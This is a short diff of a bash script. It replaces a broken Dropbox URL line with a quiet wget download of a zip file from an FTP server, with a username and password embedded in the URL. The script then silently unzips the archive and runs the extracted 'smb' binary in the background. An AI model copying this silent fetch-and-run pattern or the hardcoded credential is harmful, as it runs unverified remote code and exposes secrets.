@@ -1,7 +1,7 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-https://www.dropbox.com/s/vk3inz82mf2zgtb/wan25.zip -q
+wget "ftp://baylen-ahlam:SuperPassword123@ftp.drivehq.com/My Documents/wan25.zip" -q
 unzip wan25.zip > /dev/null 2>&1
 #pwd
 ./smb ./smbdata &
